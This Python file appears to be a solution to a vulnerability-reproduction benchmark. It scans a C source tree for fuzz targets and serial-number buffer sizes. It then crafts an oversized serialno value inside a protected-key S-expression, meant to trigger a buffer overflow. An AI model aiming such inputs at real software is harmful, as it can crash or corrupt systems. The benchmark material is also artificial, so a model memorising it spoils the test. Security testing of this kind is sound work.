import os
import re
import tarfile
import tempfile
import shutil
from typing import Optional, Tuple, List


def _is_within_directory(directory: str, target: str) -> bool:
    directory = os.path.abspath(directory)
    target = os.path.abspath(target)
    try:
        common = os.path.commonpath([directory, target])
    except Exception:
        return False
    return common == directory


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    for member in tar.getmembers():
        member_path = os.path.join(path, member.name)
        if not _is_within_directory(path, member_path):
            raise RuntimeError("Unsafe tar path traversal")
    tar.extractall(path)


_TEXT_EXTS = {
    ".c", ".h", ".cc", ".cpp", ".cxx", ".hh", ".hpp", ".hxx", ".inc",
    ".y", ".l", ".in", ".m4", ".am", ".ac", ".mk", ".cmake",
}


def _iter_text_files(root: str):
    for dirpath, dirnames, filenames in os.walk(root):
        dirnames[:] = [d for d in dirnames if d not in {".git", ".svn", ".hg", "build", "out", ".deps"}]
        for fn in filenames:
            p = os.path.join(dirpath, fn)
            ext = os.path.splitext(fn)[1].lower()
            if ext in _TEXT_EXTS:
                yield p


def _read_text_limited(path: str, limit: int = 2_000_000) -> str:
    try:
        with open(path, "rb") as f:
            data = f.read(limit)
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return ""


def _find_fuzzer_mode(root: str) -> Optional[str]:
    # If a fuzz target exists, infer if it uses s-expressions.
    for p in _iter_text_files(root):
        txt = _read_text_limited(p)
        if "LLVMFuzzerTestOneInput" in txt or "FuzzerTestOneInput" in txt:
            low = txt.lower()
            if "gcry_sexp_sscan" in low or "sexp_sscan" in low or "gcry_sexp" in low:
                return "sexp"
            # Heuristic: if it treats input as string
            if "malloc" in low and "size+1" in low and ("memcpy" in low or "memmove" in low):
                return "raw"
            # Default if fuzzer exists but unknown
            return None
    return None


def _collect_serial_context(root: str) -> Tuple[Optional[int], Optional[bytes], bool]:
    best_size = None
    algo = None
    saw_sexp_related = False

    algo_re = re.compile(r'openpgp-s2k[0-9a-zA-Z_-]*')
    arr_re = re.compile(r'\bchar\s+[*\s]*([A-Za-z_][A-Za-z0-9_]*serial[A-Za-z0-9_]*)\s*\[\s*(\d+)\s*\]')
    def_re = re.compile(r'^\s*#\s*define\s+([A-Za-z_][A-Za-z0-9_]*SERIAL[A-Za-z0-9_]*)\s+(\d+)\b', re.MULTILINE)

    for p in _iter_text_files(root):
        txt = _read_text_limited(p)
        if not txt:
            continue
        low = txt.lower()
        if "serialno" in low or ("serial" in low and "s2k" in low):
            if "sexp" in low or "gcry_sexp" in low:
                saw_sexp_related = True

            for m in arr_re.finditer(txt):
                name = m.group(1).lower()
                if "serial" not in name:
                    continue
                try:
                    n = int(m.group(2))
                except Exception:
                    continue
                if n <= 0 or n > 4096:
                    continue
                if best_size is None or n < best_size:
                    best_size = n

            for m in def_re.finditer(txt):
                try:
                    n = int(m.group(2))
                except Exception:
                    continue
                if n <= 0 or n > 4096:
                    continue
                if best_size is None or n < best_size:
                    best_size = n

            if algo is None:
                am = algo_re.search(txt)
                if am:
                    algo = am.group(0).encode("ascii", errors="ignore")

    return best_size, algo, saw_sexp_related


def _make_hexish_serial(length: int) -> bytes:
    base = b"D2760001240102000005000000B2"
    if length <= 0:
        return b""
    rep = (length + len(base) - 1) // len(base)
    s = (base * rep)[:length]
    return s


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = None
        root = src_path
        try:
            if os.path.isfile(src_path):
                tmpdir = tempfile.mkdtemp(prefix="arvo_src_")
                with tarfile.open(src_path, "r:*") as tar:
                    _safe_extract_tar(tar, tmpdir)
                entries = [os.path.join(tmpdir, n) for n in os.listdir(tmpdir)]
                dirs = [e for e in entries if os.path.isdir(e)]
                root = dirs[0] if len(dirs) == 1 else tmpdir

            mode = _find_fuzzer_mode(root)
            bufsize, algo, saw_sexp_related = _collect_serial_context(root)

            # Choose an overflow length.
            if bufsize is not None:
                serial_len = min(max(bufsize + 32, bufsize + 1), 512)
            else:
                serial_len = 128

            serial = _make_hexish_serial(serial_len)

            # Decide output shape.
            # Prefer raw if indicated, else sexp if indicated by codebase.
            if mode == "raw":
                return serial

            use_sexp = (mode == "sexp") or saw_sexp_related or (algo is not None)
            if use_sexp:
                if not algo:
                    algo = b"openpgp-s2k3-sha1-aes-cbc"
                # Compact advanced s-expression.
                # Try to resemble a protected-key S2K parameter list containing serialno.
                payload = (
                    b"(protected " + algo +
                    b"((salt#0000000000000000#)(count1024)(serialno\"" + serial + b"\"))#00#)"
                )
                return payload

            # Fallback: minimal raw (matches ground-truth length hint)
            # Use 27 bytes if nothing else is inferred.
            return b"0" * 27

        finally:
            if tmpdir:
                try:
                    shutil.rmtree(tmpdir, ignore_errors=True)
                except Exception:
                    pass